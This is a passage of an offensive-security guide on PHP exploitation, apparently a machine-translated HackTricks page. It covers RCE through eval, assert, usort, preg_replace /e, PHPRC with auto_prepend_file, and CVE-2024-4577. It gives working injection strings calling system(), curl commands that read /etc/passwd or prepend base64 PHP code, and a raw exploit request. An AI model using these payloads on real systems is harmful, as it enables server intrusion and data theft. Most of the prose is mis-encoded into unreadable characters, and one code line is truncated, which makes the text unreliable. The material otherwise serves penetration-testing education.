* **рдПрдХ рд╣реА рдбреЛрдореЗрди рдХреЗ PHPSESSION рдХреБрдХреАрдЬрд╝ рдПрдХ рд╣реА рд╕реНрдерд╛рди рдкрд░ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреЗ рд╣реИрдВ**, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдПрдХ рдбреЛрдореЗрди рдХреЗ рднреАрддрд░ **рд╡рд┐рднрд┐рдиреНрди рдХреБрдХреАрдЬрд╝ рд╡рд┐рднрд┐рдиреНрди рдкрдереЛрдВ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИрдВ** рддреЛ рдЖрдк рдЙрд╕ рдкрде рдХреЛ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ **рдЬреЛ рдХреБрдХреА рдХреЛ рдЙрд╕ рдкрде рдХрд╛ рдПрдХреНрд╕реЗрд╕ рдХрд░рддрд╛ рд╣реИ** рдЬреЛ рджреВрд╕рд░реЗ рдкрде рдХреБрдХреА рдХреЗ рдорд╛рди рдХреЛ рд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИред\
рдЗрд╕ рддрд░рд╣ рдпрджрд┐ **рджреЛрдиреЛрдВ рдкрде рдПрдХ рд╣реА рдирд╛рдо рдХреЗ рд╕рд╛рде рдПрдХ рдЪрд░ рдХреЛ рдПрдХреНрд╕реЗрд╕ рдХрд░рддреЗ рд╣реИрдВ** рддреЛ рдЖрдк **path1 рдореЗрдВ рдЙрд╕ рдЪрд░ рдХрд╛ рдорд╛рди path2 рдкрд░ рд▓рд╛рдЧреВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред рдФрд░ рдлрд┐рд░ path2 path1 рдХреЗ рдЪрд░ рдХреЛ рдорд╛рдиреНрдп рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЗрдЧрд╛ (рдХреБрдХреА рдХреЛ path2 рдореЗрдВ рдЙрд╕рдХреЗ рдЕрдиреБрд░реВрдк рдирд╛рдо рджреЗрдХрд░)ред
* рдЬрдм рдЖрдкрдХреЗ рдкрд╛рд╕ рдорд╢реАрди рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо** рд╣реЛрддреЗ рд╣реИрдВред рдкрддрд╛ рдЬрд╛рдВрдЪреЗрдВ: **/\~\<USERNAME>** рдпрд╣ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХреНрдпрд╛ php рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдПрдБ рд╕рдХреНрд░рд┐рдп рд╣реИрдВред
* [**LFI рдФрд░ RCE рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ php wrappers**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

рдпреЗ рдлрд╝рдВрдХреНрд╢рди рдЖрдорддреМрд░ рдкрд░ PHP рдореЗрдВ **рдкрд╛рд╕рд╡рд░реНрдб рд╕реЗ рд╣реИрд╢ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ** рдФрд░ рдпрд╣ **рдЬрд╛рдВрдЪрдиреЗ** рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдПрдХ рдкрд╛рд╕рд╡рд░реНрдб рд╣реИрд╢ рдХреЗ рд╕рд╛рде рд╕рд╣реА рд╣реИред\
рд╕рдорд░реНрдерд┐рдд рдПрд▓реНрдЧреЛрд░рд┐рджрдо рд╣реИрдВ: `PASSWORD_DEFAULT` рдФрд░ `PASSWORD_BCRYPT` (рдЬреЛ `$2y$` рд╕реЗ рд╢реБрд░реВ рд╣реЛрддрд╛ рд╣реИ)ред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **PASSWORD\_DEFAULT рдЕрдХреНрд╕рд░ PASSWORD\_BCRYPT рдХреЗ рд╕рдорд╛рди рд╣реЛрддрд╛ рд╣реИред** рдФрд░ рд╡рд░реНрддрдорд╛рди рдореЗрдВ, **PASSWORD\_BCRYPT** рдореЗрдВ **72bytes рдХреЗ рдЗрдирдкреБрдЯ рдореЗрдВ рдЖрдХрд╛рд░ рдХреА рд╕реАрдорд╛** рд╣реИред рдЗрд╕рд▓рд┐рдП, рдЬрдм рдЖрдк рдЗрд╕ рдПрд▓реНрдЧреЛрд░рд┐рджрдо рдХреЗ рд╕рд╛рде 72bytes рд╕реЗ рдмрдбрд╝рд╛ рдХреБрдЫ рд╣реИрд╢ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдХреЗрд╡рд▓ рдкрд╣рд▓реЗ 72B рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### HTTP headers bypass abusing PHP errors

#### Causing error after setting headers

From [**this twitter thread**](https://twitter.com/pilvar222/status/1784618120902005070?t=xYn7KdyIvnNOlkVaGbgL6A\&s=19) рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ 1000 рд╕реЗ рдЕрдзрд┐рдХ GET params рдпрд╛ 1000 POST params рдпрд╛ 20 рдлрд╝рд╛рдЗрд▓реЗрдВ рднреЗрдЬрдиреЗ рдкрд░, PHP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╣реЗрдбрд░ рд╕реЗрдЯ рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП CSP рд╣реЗрдбрд░ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдирд╛ рдЬреЛ рдХреЛрдб рдореЗрдВ рд╕реЗрдЯ рдХрд┐рдП рдЧрдП рд╣реИрдВ:
```php
<?php
header("Content-Security-Policy: default-src 'none';");
if (isset($_GET["xss"])) echo $_GET["xss"];
```
#### рд╣реЗрдбрд░ рд╕реЗрдЯ рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдПрдХ рдмреЙрдбреА рднрд░рдирд╛

рдпрджрд┐ рдПрдХ **PHP рдкреГрд╖реНрда рддреНрд░реБрдЯрд┐рдпреЛрдВ рдХреЛ рдкреНрд░рд┐рдВрдЯ рдХрд░ рд░рд╣рд╛ рд╣реИ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХреА рдЧрдИ рдХреБрдЫ рдЗрдирдкреБрдЯ рдХреЛ рд╡рд╛рдкрд╕ рдЗрдХреЛ рдХрд░ рд░рд╣рд╛ рд╣реИ**, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ PHP рд╕рд░реНрд╡рд░ рдХреЛ рдХреБрдЫ **рдЗрддрдирд╛ рд▓рдВрдмрд╛ рд╕рд╛рдордЧреНрд░реА рдкреНрд░рд┐рдВрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ** рдХрд┐ рдЬрдм рдпрд╣ **рдЙрддреНрддрд░ рдореЗрдВ рд╣реЗрдбрд░ рдЬреЛрдбрд╝рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИ**, рддреЛ рд╕рд░реНрд╡рд░ рдПрдХ рддреНрд░реБрдЯрд┐ рдлреЗрдВрдХ рджреЗрдЧрд╛ред\
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрд░рд┐рджреГрд╢реНрдп рдореЗрдВ **рд╣рдорд▓рд╛рд╡рд░ рдиреЗ рд╕рд░реНрд╡рд░ рдХреЛ рдХреБрдЫ рдмрдбрд╝реЗ рддреНрд░реБрдЯрд┐рдпрд╛рдБ рдлреЗрдВрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд┐рдпрд╛**, рдФрд░ рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рд╕реНрдХреНрд░реАрди рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрдм PHP рдиреЗ **рд╣реЗрдбрд░ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХреА, рддреЛ рдпрд╣ рдирд╣реАрдВ рдХрд░ рд╕рдХрд╛** (рддреЛ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП CSP рд╣реЗрдбрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдирд╣реАрдВ рднреЗрдЬрд╛ рдЧрдпрд╛):

![](<../../../.gitbook/assets/image (1085).png>)

## PHP рдлрд╝рдВрдХреНрд╢рдВрд╕ рдореЗрдВ SSRF

рдкреГрд╖реНрда рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:

{% content-ref url="php-ssrf.md" %}
[php-ssrf.md](php-ssrf.md)
{% endcontent-ref %}

## рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[рдЕрдзрд┐рдХ рдЙрдкрдпреЛрдЧреА PHP рдлрд╝рдВрдХреНрд╢рдВрд╕ рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ рджреЗрдЦреЗрдВ](php-useful-functions-disable\_functions-open\_basedir-bypass/)

### **preg\_replace() рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ** **RCE**
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП "replace" рддрд░реНрдХ рдореЗрдВ рдХрдо рд╕реЗ рдХрдо рдПрдХ рдореЗрд▓ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред\
preg\_replace рдХрд╛ рдпрд╣ рд╡рд┐рдХрд▓реНрдк **PHP 5.5.0 рд╕реЗ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред**

### **Eval() рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ RCE**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **RCE via Assert()**

рдпрд╣ рдлрд╝рдВрдХреНрд╢рди php рдХреЗ рднреАрддрд░ рдЖрдкрдХреЛ **рдПрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдореЗрдВ рд▓рд┐рдЦреЗ рдЧрдП рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рддрд╛рдХрд┐ **рд╕рддреНрдп рдпрд╛ рдЕрд╕рддреНрдп рд▓реМрдЯрд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗ** (рдФрд░ рдЗрд╕рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ рдмрджрд▓ рд╕рдХреЗ)ред рдЖрдорддреМрд░ рдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЪрд░ рдХреЛ рдПрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рдмреАрдЪ рдореЗрдВ рдбрд╛рд▓рд╛ рдЬрд╛рдПрдЧрд╛ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:\
`assert("strpos($_GET['page']),'..') === false")` --> рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ **RCE** рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
рдЖрдкрдХреЛ **рдХреЛрдб** **рд╕рд┐рдВрдЯреИрдХреНрд╕** рдХреЛ **рддреЛрдбрд╝рдирд╛**, рдЕрдкрдирд╛ **рдкреЗрд▓реЛрдб** **рдЬреЛрдбрд╝рдирд╛**, рдФрд░ рдлрд┐рд░ **рдЗрд╕реЗ рдлрд┐рд░ рд╕реЗ рдареАрдХ рдХрд░рдирд╛** рд╣реЛрдЧрд╛ред рдЖрдк **рд▓реЙрдЬрд┐рдХ рдСрдкрд░реЗрд╢рдВрд╕** рдЬреИрд╕реЗ "**and" рдпрд╛ "%26%26" рдпрд╛ "|"** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ "or", "||" рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддреЗ рдХреНрдпреЛрдВрдХрд┐ рдпрджрд┐ рдкрд╣рд▓реА рд╢рд░реНрдд рд╕рд╣реА рд╣реИ рддреЛ рд╣рдорд╛рд░рд╛ рдкреЗрд▓реЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдирд╣реАрдВ рд╣реЛрдЧрд╛ред рдЗрд╕реА рддрд░рд╣ ";" рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛ рдХреНрдпреЛрдВрдХрд┐ рд╣рдорд╛рд░рд╛ рдкреЗрд▓реЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдирд╣реАрдВ рд╣реЛрдЧрд╛ред

**рджреВрд╕рд░рд╛ рд╡рд┐рдХрд▓реНрдк** рд╣реИ рдХрд┐ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдореЗрдВ рдХрдорд╛рдВрдб рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ рдЬреЛрдбрд╝реЗрдВ: `'.highlight_file('.passwd').'`

**рджреВрд╕рд░рд╛ рд╡рд┐рдХрд▓реНрдк** (рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЖрдВрддрд░рд┐рдХ рдХреЛрдб рд╣реИ) рд╣реИ рдХрд┐ рдХреБрдЫ рд╡реЗрд░рд┐рдПрдмрд▓ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ рддрд╛рдХрд┐ рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ рдмрджрд▓ рд╕рдХреЗрдВ: `$file = "hola"`

### **RCE via usort()**

рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдЗрдЯрдо рдХреЗ рдПрдХ рдРрд░реЗ рдХреЛ рдХреНрд░рдордмрджреНрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред\
рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
You can also use **//** to comment the rest of the code.

To discover the number of parenthesis that you need to close:

* `?order=id;}//`: рд╣рдореЗрдВ рдПрдХ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдорд┐рд▓рддрд╛ рд╣реИ (`Parse error: syntax error, unexpected ';'`). рд╢рд╛рдпрдж рд╣рдореЗрдВ рдПрдХ рдпрд╛ рдЕрдзрд┐рдХ рдмреНрд░реИрдХреЗрдЯреНрд╕ рдХреА рдХрдореА рд╣реИред
* `?order=id);}//`: рд╣рдореЗрдВ рдПрдХ **рдЪреЗрддрд╛рд╡рдиреА** рдорд┐рд▓рддреА рд╣реИред рдпрд╣ рд╕рд╣реА рд▓рдЧрддрд╛ рд╣реИред
* `?order=id));}//`: рд╣рдореЗрдВ рдПрдХ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдорд┐рд▓рддрд╛ рд╣реИ (`Parse error: syntax error, unexpected ')' i`). рд╢рд╛рдпрдж рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдмрд╣реБрдд рдЕрдзрд┐рдХ рдХреНрд▓реЛрдЬрд┐рдВрдЧ рдмреНрд░реИрдХреЗрдЯреНрд╕ рд╣реИрдВред

### **RCE via .httaccess**

If you can **upload** a **.htaccess**, then you can **configure** several things and even execute code (configuring that files with extension .htaccess can be **executed**).

Different .htaccess shells can be found [here](https://github.com/wireghoul/htshells)

### RCE via Env Variables

If you find a vulnerability that allows you to **modify env variables in PHP** (and another one to upload files, although with more research maybe this can be bypassed), you could abuse this behaviour to get **RCE**.

* [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path): This env variable allows you load arbitrary libraries when executing other binaries (although in this case it might not work).
* **`PHPRC`** : PHP рдХреЛ **рдЕрдкрдиреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдХрд╣рд╛рдВ рд╕реНрдерд┐рдд рд╣реИ** рдЗрд╕ рдкрд░ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рдЖрдорддреМрд░ рдкрд░ `php.ini` рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдЦреБрдж рдХреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ `PHPRC` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ PHP рдХреЛ рдЙрд╕ рдкрд░ рдЗрдВрдЧрд┐рдд рдХрд░реЗрдВред рдПрдХ **`auto_prepend_file`** рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдЬреЛрдбрд╝реЗрдВ рдЬреЛ рдПрдХ рджреВрд╕рд░реЗ рдЕрдкрд▓реЛрдб рдХрд┐рдП рдЧрдП рдлрд╝рд╛рдЗрд▓ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддреА рд╣реИред рдпрд╣ рджреВрд╕рд░рд╛ рдлрд╝рд╛рдЗрд▓ рд╕рд╛рдорд╛рдиреНрдп **PHP рдХреЛрдб рд╣реИ, рдЬрд┐рд╕реЗ рдлрд┐рд░ PHP рд░рдирдЯрд╛рдЗрдо рджреНрд╡рд╛рд░рд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рдХреЛрдб рд╕реЗ рдкрд╣рд▓реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред
1. рд╣рдорд╛рд░реЗ рд╢реЗрд▓рдХреЛрдб рд╡рд╛рд▓рд╛ рдПрдХ PHP рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ
2. рдПрдХ рджреВрд╕рд░рд╛ рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ, рдЬрд┐рд╕рдореЗрдВ рдПрдХ **`auto_prepend_file`** рдирд┐рд░реНрджреЗрд╢ рд╣реЛ рдЬреЛ PHP рдкреНрд░реАрдкреНрд░реЛрд╕реЗрд╕рд░ рдХреЛ рдЪрд░рдг 1 рдореЗрдВ рдЕрдкрд▓реЛрдб рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИ
3. `PHPRC` рд╡реЗрд░рд┐рдПрдмрд▓ рдХреЛ рдЪрд░рдг 2 рдореЗрдВ рдЕрдкрд▓реЛрдб рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓ рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВред
* рдЗрд╕ рд╢реНрд░реГрдВрдЦрд▓рд╛ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рддрд░реАрдХреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдореВрд▓ рд░рд┐рдкреЛрд░реНрдЯ рд╕реЗ**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/).
* **PHPRC** - рдПрдХ рдФрд░ рд╡рд┐рдХрд▓реНрдк
* рдпрджрд┐ рдЖрдк **рдлрд╛рдЗрд▓реЗрдВ рдЕрдкрд▓реЛрдб рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ**, рддреЛ рдЖрдк FreeBSD рдореЗрдВ "рдлрд╛рдЗрд▓" `/dev/fd/0` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ **`stdin`** рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ `stdin` рдкрд░ рднреЗрдЬреЗ рдЧрдП рдЕрдиреБрд░реЛрдз рдХрд╛ **рд╢рд░реАрд░** рд╣реИ:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
* рдпрд╛ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, **`allow_url_include`** рд╕рдХреНрд╖рдо рдХрд░реЗрдВ рдФрд░ **base64 PHP рдХреЛрдб** рдХреЗ рд╕рд╛рде рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдкреНрд░реАрдкреЗрдВрдб рдХрд░реЗрдВ:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
* рддрдХрдиреАрдХ [**рдЗрд╕ рд░рд┐рдкреЛрд░реНрдЯ рд╕реЗ**](https://vulncheck.com/blog/juniper-cve-2023-36845).

### XAMPP CGI RCE - CVE-2024-4577

The webserver parses HTTP requests and passes them to a PHP script executing a request such as as [`http://host/cgi.php?foo=bar`](http://host/cgi.php?foo=bar\&ref=labs.watchtowr.com) as `php.exe cgi.php foo=bar`, which allows a parameter injection. This would allow to inject the following parameters to load the PHP code from the body:
```jsx
-d allow_url_include=1 -d auto_prepend_file=php://input
```
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, PHP рдХреЗ рдмрд╛рдж рдХреЗ рд╕рд╛рдорд╛рдиреНрдпреАрдХрд░рдг рдХреЗ рдХрд╛рд░рдг "-" рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ 0xAD рд╡рд░реНрдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред [**рдЗрд╕ рдкреЛрд╕реНрдЯ**](https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/) рд╕реЗ рд╢реЛрд╖рдг рдЙрджрд╛рд╣рд░рдг рджреЗрдЦреЗрдВ:
```jsx
POST /test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: {{host}}
User-Agent: curl/8.3.0
Accept: */*
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php
phpinfo();
?>

```
## PHP Sanitization bypass & Brain Fuck

[**рдЗрд╕ рдкреЛрд╕реНрдЯ рдореЗрдВ**](https://blog.redteam-pentesting.de/2024/moodle-rce/) рдмрд╣реБрдд рдХрдо рдЕрдиреБрдордд рд╡рд░реНрдгреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ рдмреНрд░реЗрди рдлрдХ PHP рдХреЛрдб рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╢рд╛рдирджрд╛рд░ рд╡рд┐рдЪрд╛рд░ рдорд┐рд▓ рд╕рдХрддреЗ рд╣реИрдВред\
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрд╣ рдХрдИ рдЬрд╛рдВрдЪреЛрдВ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╡рд╛рд▓реЗ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХрд╛ рдПрдХ рджрд┐рд▓рдЪрд╕реНрдк рддрд░реАрдХрд╛ рднреА рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```php
(1)->{system($_GET[chr(97)])}
```
## PHP рд╕реНрдереИрддрд┐рдХ рд╡рд┐рд╢реНрд▓реЗрд╖рдг

рджреЗрдЦреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдЗрди рдлрд╝рдВрдХреНрд╢рдиреЛрдВ (рд╕реЗ [рдпрд╣рд╛рдБ](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be)) рдореЗрдВ рдХреЙрд▓ рдореЗрдВ рдХреЛрдб рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ:
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
рдпрджрд┐ рдЖрдк рдПрдХ PHP рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдбрд┐рдмрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рддреЛ рдЖрдк `display_errors = On` рдЬреЛрдбрд╝рдХрд░ `/etc/php5/apache2/php.ini` рдореЗрдВ рд╡реИрд╢реНрд╡рд┐рдХ рд░реВрдк рд╕реЗ рддреНрд░реБрдЯрд┐ рдкреНрд░рд┐рдВрдЯрд┐рдВрдЧ рд╕рдХреНрд╖рдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдкрд╛рдЪреЗ рдХреЛ рдкреБрдирдГ рдкреНрд░рд╛рд░рдВрдн рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: `sudo systemctl restart apache2`

### PHP рдХреЛрдб рдХрд╛ рдбрд┐рдУрдмрдлрд╕реНрдХреЗрдЯрд┐рдВрдЧ

рдЖрдк **www.unphp.net** рдХрд╛ рдЙрдкрдпреЛрдЧ PHP рдХреЛрдб рдХреЛ рдбрд┐рдУрдмрдлрд╕реНрдХреЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## PHP рд░реИрдкрд░ рдФрд░ рдкреНрд░реЛрдЯреЛрдХреЙрд▓

PHP рд░реИрдкрд░ рдФрд░ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдЖрдкрдХреЛ рдПрдХ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ **рд▓рд┐рдЦрдиреЗ рдФрд░ рдкрдврд╝рдиреЗ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрд╛рдпрдкрд╛рд╕** рдХрд░рдиреЗ рдФрд░ рдЗрд╕реЗ рд╕рдордЭреМрддрд╛ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддреЗ рд╣реИрдВред [**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЗрд╕ рдкреГрд╖реНрда рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols)ред

## Xdebug рдмрд┐рдирд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╡рд╛рд▓рд╛ RCE

